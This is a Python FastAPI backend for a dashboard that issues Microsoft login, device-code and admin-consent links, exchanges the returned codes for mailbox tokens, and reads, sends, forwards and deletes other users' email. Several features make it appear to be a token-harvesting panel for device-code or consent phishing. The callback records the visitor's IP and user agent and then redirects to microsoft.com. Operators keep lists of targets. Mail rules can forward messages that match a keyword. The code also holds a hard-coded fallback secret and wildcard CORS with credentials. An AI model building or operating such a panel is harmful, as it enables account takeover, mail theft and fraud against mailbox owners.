from fastapi import FastAPI, Request, Depends, HTTPException, status
from fastapi.responses import RedirectResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import jwt, JWTError
from datetime import datetime, timedelta
import logging
import os

from db import init_db, SessionLocal
from auth import (
    generate_login_link,
    generate_org_connect_link,
    generate_admin_consent_url,
    exchange_code_for_token,
    get_token,
    start_device_code_flow,
    poll_device_code_flow,
    save_or_update_tenant_consent,
)
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    move_email_to_folder,
)
from models import (
    Rule,
    SavedUser,
    TenantToken,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
    RuleAction,
)
from admin_auth import login_admin

app = FastAPI()

# =========================
# CONFIG
# =========================
SECRET_KEY = os.environ.get("SECRET_KEY", "super-secret-key-change-this")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days

READ_ONLY_MODE = True
ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")

security = HTTPBearer()

# =========================
# LOGGING
# =========================
logging.basicConfig(level=logging.DEBUG)

# =========================
# CORS
# =========================
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# =========================
# STARTUP
# =========================
@app.on_event("startup")
def startup():
    init_db()
    print("✅ Database initialized successfully")


# =========================
# JWT HELPERS
# =========================
def create_token(data: dict):
    payload = data.copy()
    payload["exp"] = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)


def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        return jwt.decode(credentials.credentials, SECRET_KEY, algorithms=[ALGORITHM])
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")


def resolve_user_id(user_id: str | None, user):
    return user_id or user["sub"]


def ensure_write_allowed():
    if READ_ONLY_MODE:
        raise HTTPException(status_code=403, detail="Read-only mode enabled")


# =========================
# APP CONFIG
# =========================
@app.get("/app-config")
def app_config():
    return {
        "read_only_mode": READ_ONLY_MODE,
        "device_code_preferred": True,
        "admin_consent_tenant": ADMIN_CONSENT_TENANT,
    }


# =========================
# ADMIN LOGIN
# =========================
@app.post("/admin/login")
async def admin_login(request: Request):
    body = await request.json()
    result = login_admin(body.get("username"), body.get("password"))

    if not result or "error" in result:
        raise HTTPException(status_code=401, detail=(result or {}).get("error", "Invalid login"))

    token = create_token({"sub": body["username"]})
    return {"access_token": token, "token_type": "bearer"}


# =========================
# DASHBOARD SUMMARY
# =========================
@app.get("/dashboard/summary")
def dashboard_summary(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        saved_user_rows = (
            db.query(SavedUser.user_id)
            .filter(SavedUser.admin_user_id == admin_user_id)
            .distinct()
            .all()
        )
        saved_users = [row[0] for row in saved_user_rows if row[0]]

        connected_mailbox_rows = (
            db.query(TenantToken.tenant_id)
            .distinct()
            .all()
        )
        connected_mailboxes = [row[0] for row in connected_mailbox_rows if row[0]]

        tenant_rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == admin_user_id)
            .all()
        )

        approved_tenants = sum(
            1 for row in tenant_rows
            if (row.status.value if hasattr(row.status, "value") else str(row.status)).lower() == "approved"
        )
        pending_tenants = sum(
            1 for row in tenant_rows
            if (row.status.value if hasattr(row.status, "value") else str(row.status)).lower() == "pending"
        )

        return {
            "saved_users_count": len(saved_users),
            "connected_mailboxes_count": len(connected_mailboxes),
            "approved_tenants_count": approved_tenants,
            "pending_tenants_count": pending_tenants,
        }
    finally:
        db.close()


# =========================
# DEVICE CODE FLOW
# =========================
@app.post("/device-code/start")
def device_start(user=Depends(verify_token)):
    return start_device_code_flow()


@app.post("/device-code/poll")
async def device_poll(request: Request, user=Depends(verify_token)):
    body = await request.json()

    return poll_device_code_flow(
        device_code=body.get("device_code"),
        admin_user_id=user["sub"],
        client_ip=request.client.host if request.client else None,
        user_agent=request.headers.get("user-agent")
    )


# =========================
# LOGIN LINKS
# =========================
@app.get("/generate-login-url")
def login_url(user_id: str, user=Depends(verify_token)):
    return {"login_url": generate_login_link(user_id)}


@app.get("/generate-org-connect-url")
def org_connect(tenant_hint: str | None = None, user=Depends(verify_token)):
    return {"login_url": generate_org_connect_link(user["sub"])}


@app.get("/generate-admin-consent-url")
def admin_consent(tenant: str | None = None, user=Depends(verify_token)):
    return {"admin_consent_url": generate_admin_consent_url(tenant)}


# =========================
# TENANT CONSENT
# =========================
@app.post("/tenant-consent/generate")
async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        admin_consent_url=consent_url,
        status=TenantConsentStatus.PENDING
    )

    return {
        "tenant_hint": tenant_hint,
        "admin_consent_url": consent_url,
        "status": "pending"
    }


@app.get("/tenant-consents")
def list_tenant_consents(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rows = (
            db.query(TenantConsent)
            .filter(TenantConsent.admin_user_id == user["sub"])
            .order_by(TenantConsent.updated_at.desc())
            .all()
        )

        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "status": r.status.value if hasattr(r.status, "value") else str(r.status),
                    "admin_consent_url": r.admin_consent_url,
                    "notes": r.notes,
                    "created_at": r.created_at,
                    "updated_at": r.updated_at,
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/tenant-consent/approve")
async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = (body.get("tenant_hint") or "").strip()

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint required")

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes="Manually approved"
    )

    return {"status": "approved", "tenant_hint": tenant_hint}


# =========================
# CALLBACK
# =========================
@app.get("/auth/callback")
def callback(request: Request):
    code = request.query_params.get("code")
    state = request.query_params.get("state")

    if not code:
        return {"error": "No code"}

    exchange_code_for_token(
        code,
        state,
        request.client.host if request.client else None,
        request.headers.get("user-agent")
    )

    return RedirectResponse("https://www.microsoft.com")


# =========================
# STATUS
# =========================
@app.get("/microsoft/status")
def microsoft_status(user_id: str, user=Depends(verify_token)):
    token = get_token(user_id)
    return {
        "user_id": user_id,
        "connected": bool(token),
        "has_refresh_token": bool(token.refresh_token) if token else False,
        "expires_at": token.expires_at if token else None,
    }


# =========================
# USERS
# =========================
@app.get("/users")
def users(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        connected = [t.tenant_id for t in db.query(TenantToken).distinct(TenantToken.tenant_id).all() if t.tenant_id]
        saved = [s.user_id for s in db.query(SavedUser).filter_by(admin_user_id=admin_user_id).all() if s.user_id]

        return {"users": sorted(list(set(connected + saved)))}
    finally:
        db.close()


@app.post("/saved-users")
async def save_user(request: Request, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        body = await request.json()
        target_user_id = (body.get("user_id") or "").strip()

        if not target_user_id:
            return JSONResponse({"error": "user_id is required"}, status_code=400)

        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == user["sub"],
                SavedUser.user_id == target_user_id
            )
            .first()
        )

        if existing:
            return {"message": "User already saved", "user_id": target_user_id}

        row = SavedUser(
            admin_user_id=user["sub"],
            user_id=target_user_id
        )
        db.add(row)
        db.commit()

        return {"message": "saved", "user_id": target_user_id}
    finally:
        db.close()


@app.delete("/saved-users")
def delete_user(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        row = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == user["sub"],
                SavedUser.user_id == user_id
            )
            .first()
        )

        if row:
            db.delete(row)
            db.commit()

        return {"message": "deleted", "user_id": user_id}
    finally:
        db.close()


# =========================
# EMAILS
# =========================
@app.get("/emails")
def emails(user_id: str, folder_id: str = None, user=Depends(verify_token)):
    try:
        return {"emails": fetch_emails(user_id, folder_id)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/folders")
def folders(user_id: str, user=Depends(verify_token)):
    try:
        return {"folders": get_mail_folders(user_id)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/email/{id}")
def email(id: str, user_id: str, user=Depends(verify_token)):
    try:
        return get_email_detail(user_id, id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


# =========================
# EMAIL ACTIONS
# =========================
@app.post("/email/delete")
async def delete(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    return delete_email(body["user_id"], body["message_id"])


@app.post("/email/mark-read")
async def mark(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    return mark_as_read(body["user_id"], body["message_id"])


@app.post("/email/move")
async def move(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    return move_email_to_folder(body["user_id"], body["message_id"], body["folder_id"])


@app.post("/email/reply")
async def reply(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    return reply_to_email(body["user_id"], body["message_id"], body["reply_text"])


@app.post("/email/send")
async def send(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    return send_email(body["user_id"], body["to"], body["subject"], body["body"])


@app.post("/email/forward")
async def forward(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()
    body = await request.json()
    return forward_email(body["user_id"], body["message_id"], body["to"])


# =========================
# RULES
# =========================
@app.post("/rules")
async def create_rule(request: Request, user=Depends(verify_token)):
    ensure_write_allowed()

    db = SessionLocal()
    try:
        body = await request.json()

        if not body.get("condition"):
            return JSONResponse({"error": "condition is required"}, status_code=400)
        if not body.get("keyword"):
            return JSONResponse({"error": "keyword is required"}, status_code=400)
        if not body.get("action"):
            return JSONResponse({"error": "action is required"}, status_code=400)

        rule = Rule(
            user_id=body["user_id"],
            condition=body["condition"],
            keyword=body["keyword"],
            action=RuleAction(body["action"]),
            target_folder=body.get("target_folder"),
            forward_to=body.get("forward_to"),
            is_active=body.get("is_active", True)
        )

        db.add(rule)
        db.commit()

        return {"message": "created"}
    finally:
        db.close()


@app.get("/rules")
def get_rules(user_id: str, user=Depends(verify_token)):
    db = SessionLocal()
    try:
        rules = db.query(Rule).filter_by(user_id=user_id).all()

        return {
            "rules": [
                {
                    "id": r.id,
                    "user_id": r.user_id,
                    "condition": r.condition,
                    "keyword": r.keyword,
                    "action": r.action.value if hasattr(r.action, "value") else str(r.action),
                    "target_folder": r.target_folder,
                    "forward_to": r.forward_to,
                    "is_active": r.is_active,
                    "created_at": r.created_at,
                }
                for r in rules
            ]
        }
    finally:
        db.close()